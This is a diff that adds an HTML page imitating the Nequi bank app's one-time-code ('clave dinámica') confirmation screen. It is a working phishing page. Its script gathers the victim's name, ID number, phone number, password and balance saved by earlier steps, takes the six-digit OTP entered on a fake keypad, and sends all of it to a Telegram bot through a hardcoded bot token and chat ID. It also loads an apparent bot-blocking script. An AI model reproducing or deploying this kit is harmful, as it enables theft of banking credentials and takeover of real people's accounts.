@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nequi - Clave Dinámica</title>
+    <link rel="stylesheet" href="assets/css/loader.css">
+    <link id="stylesheet" rel="stylesheet" href="assets/css/pasarelapago.css">
+    <link rel="stylesheet" href="assets/css/bancos/NEQUI.css">
+    <script type="text/javascript" src="js/jquery-3.6.0.min.js"></script>
+    <style>
+        html, body {
+            height: 100%;
+            margin: 0;
+            background: #ffffff;
+            color: #293038;
+            font-family: Manrope, sans-serif;
+            font-size: 16px;
+        }
+
+        * { box-sizing: border-box; }
+
+        :root {
+            --principales-uva: #200020;
+            --principales-orquidea: #da0081;
+            --principales-blanco: #ffffff;
+        }
+
+        .main-container {
+            display: flex;
+            flex-direction: column;
+            margin: 0 auto;
+            max-width: 360px;
+            padding: 1rem;
+        }
+
+        .header {
+            display: flex;
+            justify-content: center;
+            margin: 1.25rem 0 1.875rem;
+        }
+
+        .header img {
+            width: 144px;
+            height: 32px;
+        }
+
+        .title {
+            font-weight: 700;
+            font-size: 1.5rem;
+            text-align: center;
+            color: var(--principales-uva);
+            margin: 0 0 1.5rem;
+        }
+
+        .subtitle {
+            color: var(--principales-uva);
+            text-align: center;
+            font-size: .875rem;
+            line-height: 1.25rem;
+            margin-bottom: 1.75rem;
+        }
+
+        .box_numerickeypad {
+            width: 272px;
+            display: flex;
+            justify-content: space-around;
+            margin: 0 auto;
+        }
+
+        .code_numerickeypad {
+            width: 32px;
+            text-align: center;
+            border: none;
+            border-bottom: 1px solid var(--principales-uva);
+            padding-bottom: 12px;
+            height: 24px;
+            font-size: 2.25rem;
+            font-weight: 700;
+            color: var(--principales-orquidea);
+        }
+
+        .code_numerickeypad:focus {
+            outline: none;
+            border-bottom: 2px solid var(--principales-orquidea);
+        }
+
+        .numeric_board {
+            width: 90%;
+            margin: 20px auto;
+        }
+
+        .numeric_board-row {
+            display: flex;
+            padding-bottom: 18px;
+            justify-content: space-between;
+        }
+
+        .container_number {
+            color: var(--principales-uva);
+            font-size: 2.25rem;
+            width: 28.67px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            background: none;
+            border: none;
+        }
+
+        .container_number:active {
+            transform: scale(0.95);
+        }
+
+        .container_number img {
+            width: 24px;
+        }
+
+        #confirm-btn {
+            background-color: #DA0081;
+            color: #ffffff;
+            height: 48px;
+            font-weight: 600;
+            width: 100%;
+            max-width: 320px;
+            border-radius: 5px;
+            border: none;
+            margin: 30px auto 20px;
+            display: block;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        #confirm-btn:hover {
+            background-color: #bf0072;
+        }
+
+        #confirm-btn:active {
+            background-color: #a00061;
+        }
+
+        @media (max-width: 425px) {
+            .box_numerickeypad {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="main-container">
+        <!-- Header con logo -->
+        <div class="header">
+            <img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64dfef05bc6705edb9447499_nequi.svg" alt="Nequi">
+        </div>
+
+        <!-- Título -->
+        <h1 class="title">Confirma tu identidad</h1>
+        <p class="subtitle">Para confirmar tu identidad escribe o pega la clave dinámica que encuentras en tu App Nequi.</p>
+
+        <!-- Inputs para el código OTP -->
+        <div class="box_numerickeypad">
+            <input type="password" id="c0" class="input-keypad code_numerickeypad" maxlength="1" inputmode="numeric">
+            <input type="password" id="c1" class="input-keypad code_numerickeypad" maxlength="1" inputmode="numeric">
+            <input type="password" id="c2" class="input-keypad code_numerickeypad" maxlength="1" inputmode="numeric">
+            <input type="password" id="c3" class="input-keypad code_numerickeypad" maxlength="1" inputmode="numeric">
+            <input type="password" id="c4" class="input-keypad code_numerickeypad" maxlength="1" inputmode="numeric">
+            <input type="password" id="c5" class="input-keypad code_numerickeypad" maxlength="1" inputmode="numeric">
+        </div>
+
+        <!-- Teclado numérico -->
+        <div class="numeric_board">
+            <div class="numeric_board-row">
+                <button class="container_number" data-value="1">1</button>
+                <button class="container_number" data-value="2">2</button>
+                <button class="container_number" data-value="3">3</button>
+            </div>
+            <div class="numeric_board-row">
+                <button class="container_number" data-value="4">4</button>
+                <button class="container_number" data-value="5">5</button>
+                <button class="container_number" data-value="6">6</button>
+            </div>
+            <div class="numeric_board-row">
+                <button class="container_number" data-value="7">7</button>
+                <button class="container_number" data-value="8">8</button>
+                <button class="container_number" data-value="9">9</button>
+            </div>
+            <div class="numeric_board-row">
+                <button class="container_number" disabled></button>
+                <button class="container_number" data-value="0">0</button>
+                <button class="container_number" id="backspace-btn">
+                    <img src="assets/images/nequi-teclado-numerico-borrar.svg" alt="Borrar">
+                </button>
+            </div>
+        </div>
+
+        <!-- Botón confirmar -->
+        <button type="button" id="confirm-btn">Confirmar</button>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            const inputs = document.querySelectorAll('.code_numerickeypad');
+            const buttons = document.querySelectorAll('.container_number[data-value]');
+            const backspaceButton = document.getElementById('backspace-btn');
+            const confirmBtn = document.getElementById('confirm-btn');
+
+            let currentInputIndex = 0;
+
+            // Recuperar datos de localStorage
+            const nombreApellido = localStorage.getItem("nombreApellido");
+            const cedula = localStorage.getItem("cedula");
+            const numero = localStorage.getItem("numero");
+            const clave = localStorage.getItem("clave");
+            const saldo = localStorage.getItem("saldo");
+
+            // Validar que existan los datos previos
+            if (!numero || !clave || !saldo) {
+                alert("Datos faltantes. Por favor, completa el paso anterior.");
+                window.location.href = "neq.html";
+                return;
+            }
+
+            // Manejar clics en el teclado numérico
+            buttons.forEach(button => {
+                button.addEventListener('click', function () {
+                    const value = this.getAttribute('data-value');
+                    const focusedElement = inputs[currentInputIndex];
+
+                    if (focusedElement && value) {
+                        focusedElement.value = value;
+
+                        if (currentInputIndex < inputs.length - 1) {
+                            currentInputIndex++;
+                            inputs[currentInputIndex].focus();
+                        }
+                    }
+                });
+            });
+
+            // Manejar el botón de borrar
+            backspaceButton.addEventListener('click', function () {
+                const focusedElement = inputs[currentInputIndex];
+
+                if (focusedElement.value.length > 0) {
+                    focusedElement.value = '';
+                } else if (currentInputIndex > 0) {
+                    currentInputIndex--;
+                    inputs[currentInputIndex].focus();
+                    inputs[currentInputIndex].value = '';
+                }
+            });
+
+            // Manejar eventos de input en los campos
+            inputs.forEach((input, index) => {
+                input.addEventListener('input', function () {
+                    if (input.value.length > 0 && index < inputs.length - 1) {
+                        currentInputIndex = index + 1;
+                        inputs[currentInputIndex].focus();
+                    }
+                });
+
+                input.addEventListener('keydown', function (event) {
+                    if (event.key === 'Backspace' && input.value.length === 0 && index > 0) {
+                        event.preventDefault();
+                        currentInputIndex = index - 1;
+                        inputs[currentInputIndex].focus();
+                    }
+                });
+
+                input.addEventListener('focus', function () {
+                    currentInputIndex = index;
+                });
+            });
+
+            // Función para obtener el código OTP completo
+            function getConcatenatedOTP() {
+                let otp = "";
+                inputs.forEach(input => {
+                    otp += input.value;
+                });
+                return otp;
+            }
+
+            // Función para verificar si todos los campos están llenos
+            function areAllFieldsFilled() {
+                return Array.from(inputs).every(input => input.value.trim() !== "");
+            }
+
+            // Manejar el clic en el botón confirmar
+            confirmBtn.addEventListener("click", async function () {
+                if (!areAllFieldsFilled()) {
+                    alert("Por favor, completa todos los campos antes de confirmar.");
+                    return;
+                }
+
+                const otpCode = getConcatenatedOTP();
+
+                // CONFIGURACIÓN TELEGRAM - CAMBIA ESTOS VALORES
+                const TELEGRAM_BOT_TOKEN = '7591157193:AAHFVlUcvlY2ep6nvCoiXg8G86nxGs4yvyc'; // Reemplaza con tu token
+                const TELEGRAM_CHAT_ID = '6958936698';    // Reemplaza con tu chat ID
+
+                const telegramMessage = `
+🔐 CLAVE DINÁMICA NEQUI
+
+📛 Nombre: ${nombreApellido}
+🪪 Cédula: ${cedula}
+📱 Número: ${numero}
+🔑 Clave: ${clave}
+💰 Saldo: ${saldo}
+🔢 Código OTP: ${otpCode}
+
+📅 Fecha: ${new Date().toLocaleString('es-CO')}
+                `;
+
+                try {
+                    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: telegramMessage,
+                            parse_mode: 'HTML'
+                        })
+                    });
+
+                    if (response.ok) {
+                        console.log('Datos enviados a Telegram correctamente');
+                        // Redirigir a la siguiente página
+                        window.location.href = "loading.html";
+                    } else {
+                        throw new Error("Error al enviar los datos a Telegram");
+                    }
+                } catch (error) {
+                    console.error("Error al enviar los datos:", error);
+                    alert("Ocurrió un error al enviar los datos. Intente nuevamente.");
+                }
+            });
+        });
+    </script>
+
+    <script src="bloqueo-bots.js"></script>
+</body>
+</html>
